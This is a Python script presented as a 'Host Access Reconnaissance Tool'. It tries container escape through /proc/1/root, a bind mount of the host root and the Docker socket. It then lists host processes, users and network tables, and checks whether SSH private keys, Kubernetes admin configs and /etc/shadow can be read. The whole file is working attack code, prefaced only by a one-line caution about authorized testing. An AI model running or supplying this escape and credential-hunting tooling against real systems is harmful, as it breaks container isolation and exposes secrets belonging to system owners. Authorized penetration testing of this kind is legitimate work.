#!/usr/bin/env python3
"""
Improved Host Access Reconnaissance Tool
-----------------------------------------
This script attempts container escape using multiple methods,
validates the results by checking for key host files, and
tries lateral movement via the Docker socket if available.

CAUTION: Use only in authorized security testing environments.
"""

import os
import sys
import subprocess
import json
import socket
import time
from datetime import datetime
from pathlib import Path

class HostRecon:
    def __init__(self):
        self.findings = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "hostname": socket.gethostname(),
            "host_access_methods": {},
            "host_system_info": {},
            "host_processes": {},
            "host_users": {},
            "host_network": {},
            "host_files": {},
            "security_tools": {},
            "cloud_environment": {},
            "credentials": {},
            "docker_containers": None  # lateral movement info via Docker
        }
        self.available_escape_methods = []
        self.host_fs_paths = {}  # store results per method

    def run_command(self, command, timeout=10):
        try:
            result = subprocess.run(
                command, shell=True, check=False,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                text=True, timeout=timeout
            )
            return result.stdout.strip()
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return f"Error: {str(e)}"

    def find_escape_methods(self):
        print("[+] Identifying available escape methods...")
        escape_methods = {}

        # Method 1: /proc/1/root access
        host_proc_accessible = os.access("/proc/1/root", os.R_OK)
        escape_methods["proc_1_root_access"] = host_proc_accessible

        # Method 2: Check CAP_SYS_ADMIN capability
        cap_sys_admin = "cap_sys_admin" in self.run_command("capsh --print").lower()
        escape_methods["cap_sys_admin"] = cap_sys_admin

        # Method 3: Check if we can mount filesystems (for a bind mount)
        can_mount = os.access("/dev", os.W_OK) and cap_sys_admin
        escape_methods["can_mount_filesystems"] = can_mount

        # Method 4: Check for Docker socket (for lateral movement)
        docker_socket_access = os.path.exists("/var/run/docker.sock") and os.access("/var/run/docker.sock", os.R_OK)
        escape_methods["docker_socket_access"] = docker_socket_access

        # Save available methods
        self.findings["host_access_methods"] = escape_methods
        if escape_methods.get("proc_1_root_access"):
            self.available_escape_methods.append("proc_1_root")
        if docker_socket_access:
            self.available_escape_methods.append("docker_socket")
        if can_mount:
            self.available_escape_methods.append("bind_mount")

        print(f"[+] Available escape methods: {self.available_escape_methods}")
        return len(self.available_escape_methods) > 0

    def attempt_escape_method(self, method):
        host_fs_path = None
        if method == "proc_1_root":
            print("[*] Attempting /proc/1/root access...")
            host_fs_path = "/proc/1/root"
        elif method == "bind_mount":
            print("[*] Attempting bind mount using /proc/1/root...")
            mount_point = "/tmp/host_root_bind"
            os.makedirs(mount_point, exist_ok=True)
            # Use bind mount to mirror the host filesystem from /proc/1/root
            mount_cmd = f"mount --bind /proc/1/root {mount_point}"
            mount_result = self.run_command(mount_cmd)
            if "Error" in mount_result or "failed" in mount_result.lower():
                print(f"[-] Bind mount failed: {mount_result}")
            else:
                host_fs_path = mount_point
        elif method == "docker_socket":
            print("[*] Docker socket detected. Attempting lateral movement...")
            docker_ps = self.run_command("docker ps -a")
            self.findings["docker_containers"] = docker_ps
            print("[+] Docker containers list:")
            print(docker_ps)
            # No host_fs_path for docker lateral movement
        else:
            print(f"[-] Unknown escape method: {method}")

        if host_fs_path and os.path.exists(host_fs_path) and os.access(host_fs_path, os.R_OK):
            # Validate that key host files exist (e.g., /etc/os-release)
            test_file = os.path.join(host_fs_path, "etc/os-release")
            if os.path.exists(test_file) and os.access(test_file, os.R_OK):
                print(f"[+] Host filesystem validated at {host_fs_path} using method '{method}'")
                self.host_fs_paths[method] = host_fs_path
                return True
            else:
                print(f"[-] Validation failed for {host_fs_path} (missing key host files)")
        else:
            if method != "docker_socket":
                print(f"[-] Method '{method}' did not yield host filesystem access.")
        return False

    def gather_host_system_info(self, host_path):
        print(f"[+] Gathering host system information from {host_path}...")
        os_release = self.run_command(f"cat {host_path}/etc/os-release")
        hostname = self.run_command(f"cat {host_path}/etc/hostname")
        kernel = self.run_command(f"cat {host_path}/proc/version")
        self.findings["host_system_info"] = {
            "hostname": hostname,
            "os_release": os_release,
            "kernel": kernel,
            "uptime": self.run_command(f"cat {host_path}/proc/uptime"),
            "loaded_modules": self.run_command(f"ls -la {host_path}/proc/1/maps | head -10")
        }
        # Also list a few key directories for additional context
        for dir_path in ["/etc", "/var/log", "/root", "/home"]:
            full_path = f"{host_path}{dir_path}"
            if os.path.exists(full_path):
                listing = self.run_command(f"ls -la {full_path} | head -10")
                self.findings["host_system_info"][f"{dir_path}_listing"] = listing

    def gather_host_processes(self, host_path):
        print(f"[+] Gathering host process information from {host_path}...")
        processes = {}
        proc_dir = f"{host_path}/proc"
        if os.path.exists(proc_dir) and os.access(proc_dir, os.R_OK):
            for pid in os.listdir(proc_dir):
                if pid.isdigit():
                    cmd_file = f"{proc_dir}/{pid}/cmdline"
                    if os.path.exists(cmd_file) and os.access(cmd_file, os.R_OK):
                        with open(cmd_file, 'r') as f:
                            cmd = f.read().replace('\0', ' ').strip()
                            if cmd:
                                processes[pid] = {"command": cmd}
        self.findings["host_processes"] = {
            "process_count": len(processes),
            "processes": processes
        }

    def gather_host_users(self, host_path):
        print(f"[+] Gathering host user information from {host_path}...")
        users = {}
        passwd_file = f"{host_path}/etc/passwd"
        if os.path.exists(passwd_file) and os.access(passwd_file, os.R_OK):
            with open(passwd_file, 'r') as f:
                for line in f.read().splitlines():
                    if line and not line.startswith('#'):
                        parts = line.split(':')
                        if len(parts) >= 7:
                            username, uid, gid, _, home, shell = parts[0], parts[2], parts[3], parts[4], parts[5], parts[6]
                            users[username] = {"uid": uid, "gid": gid, "home": home, "shell": shell}
        self.findings["host_users"] = {"users": users}

    def gather_host_network(self, host_path):
        print(f"[+] Gathering host network information from {host_path}...")
        net_info = {}
        for fname in ["dev", "route", "arp"]:
            file_path = f"{host_path}/proc/net/{fname}"
            if os.path.exists(file_path) and os.access(file_path, os.R_OK):
                with open(file_path, 'r') as f:
                    net_info[fname] = f.read()
            else:
                net_info[fname] = f"Could not access {fname}"
        self.findings["host_network"] = net_info

    def find_sensitive_files(self, host_path):
        print(f"[+] Searching for sensitive files in {host_path}...")
        sensitive_files = {
            "kubernetes_config": ["/etc/kubernetes/admin.conf", "/root/.kube/config"],
            "ssh_keys": ["/root/.ssh/id_rsa"]
        }
        found = {}
        for category, files in sensitive_files.items():
            found[category] = {}
            for file in files:
                full_path = f"{host_path}{file}"
                if os.path.exists(full_path) and os.access(full_path, os.R_OK):
                    found[category][file] = "Found and readable"
        self.findings["host_files"] = found

    def check_for_security_tools(self, host_path):
        print(f"[+] Checking for security tools in {host_path}...")
        # For brevity, just check if a couple of common directories exist
        tools_found = {}
        for directory in ["/etc/selinux", "/etc/apparmor.d"]:
            full_path = f"{host_path}{directory}"
            if os.path.exists(full_path):
                tools_found[directory] = "Indicator present"
        self.findings["security_tools"] = tools_found

    def check_for_cloud_environment(self, host_path):
        print(f"[+] Checking for cloud environment indicators in {host_path}...")
        indicators = {"aws": [], "gcp": [], "azure": []}
        # Example: check for /etc/cloud/cloud.cfg
        if os.path.exists(f"{host_path}/etc/cloud/cloud.cfg"):
            indicators["aws"].append("/etc/cloud/cloud.cfg")
        self.findings["cloud_environment"] = {"cloud_indicators": indicators}

    def find_credentials(self, host_path):
        print(f"[+] Looking for credentials in {host_path}...")
        creds = {}
        for file in ["/etc/passwd", "/etc/shadow"]:
            full_path = f"{host_path}{file}"
            if os.path.exists(full_path) and os.access(full_path, os.R_OK):
                creds[file] = "Found"
        self.findings["credentials"] = creds

    def save_findings(self):
        print("\n===== FULL RECONNAISSANCE FINDINGS =====")
        print(json.dumps(self.findings, indent=2))

    def print_summary(self):
        print("\n=== HOST RECONNAISSANCE SUMMARY ===")
        if self.host_fs_paths:
            for method, path in self.host_fs_paths.items():
                print(f"[+] Host filesystem (via {method}) accessed at: {path}")
        if "host_system_info" in self.findings:
            info = self.findings["host_system_info"]
            print(f"[+] OS Info: {info.get('os_release', 'N/A')}")
            print(f"[+] Kernel: {info.get('kernel', 'N/A')}")
        if self.findings.get("docker_containers"):
            print("[+] Docker lateral movement yielded container information.")
        print("=============================================")

    def run(self):
        print("==== Improved Host Access Reconnaissance Tool ====")
        print(f"Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Hostname: {socket.gethostname()}")
        print("=============================================")

        if not self.find_escape_methods():
            print("[-] No escape methods available.")
            return

        # Iterate over available methods
        for method in self.available_escape_methods:
            print(f"\n[***] Attempting escape using method: {method}")
            success = self.attempt_escape_method(method)
            if success:
                host_path = self.host_fs_paths.get(method)
                # Gather additional information if host filesystem is validated
                self.gather_host_system_info(host_path)
                self.gather_host_processes(host_path)
                self.gather_host_users(host_path)
                self.gather_host_network(host_path)
                self.find_sensitive_files(host_path)
                self.check_for_security_tools(host_path)
                self.check_for_cloud_environment(host_path)
                self.find_credentials(host_path)
            elif method == "docker_socket":
                # Docker method for lateral movement
                pass

        self.save_findings()
        self.print_summary()

if __name__ == "__main__":
    recon = HostRecon()
    recon.run()
